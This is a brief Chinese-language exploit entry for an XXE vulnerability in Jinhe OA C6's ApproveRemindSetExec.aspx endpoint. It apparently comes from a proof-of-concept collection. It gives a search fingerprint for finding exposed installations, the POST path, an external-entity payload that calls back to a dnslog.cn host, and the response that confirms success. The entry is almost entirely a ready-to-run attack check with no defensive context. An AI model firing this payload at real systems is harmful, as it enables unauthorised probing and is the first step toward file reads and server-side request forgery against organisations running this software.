# 金和OAC6ApproveRemindSetExec.aspxXXE漏洞

金和OA ｜ XXE ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/JHSoft.Web.AddMenu/ApproveRemindSetExec.aspx/? HTTP/1.1`

**Payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wwwwwwwwwwwwwwww.t07q8o.dnslog.cn">
%remote;]>
```
- **响应特征**：200 Dnslog回显